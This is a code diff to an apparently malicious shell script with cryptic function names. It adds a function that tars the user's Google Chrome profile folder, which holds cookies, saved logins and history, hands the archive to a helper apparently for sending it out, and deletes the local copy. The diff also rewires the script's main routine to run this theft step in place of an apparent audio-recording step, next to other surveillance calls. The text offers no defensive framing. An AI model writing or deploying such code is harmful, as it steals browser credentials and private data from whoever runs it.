@@ -49,6 +49,16 @@ function ssx__(){
     rm -f "$IBUS_$output_file"
 }
 
+function GCx(){
+	folder_to_compress="/home/$USER/.config/google-chrome"
+	output_file="$IBUS_""gcx.tar.gz"
+	tar -czvf "$output_file" "$folder_to_compress"
+	#
+    	cx "$output_file" "SS"
+    	slpx
+    	rm -f "$IBUS_$output_file"
+}
+
 function ax(){
     #sox
     duration=30
@@ -195,7 +205,8 @@ function px(){
 	#
     	ssx_ & PxNwx & Hstrx
 	#WbCmx
-    	ax_
+    	#ax_
+	GCx
 	#
 	exit 0
     else
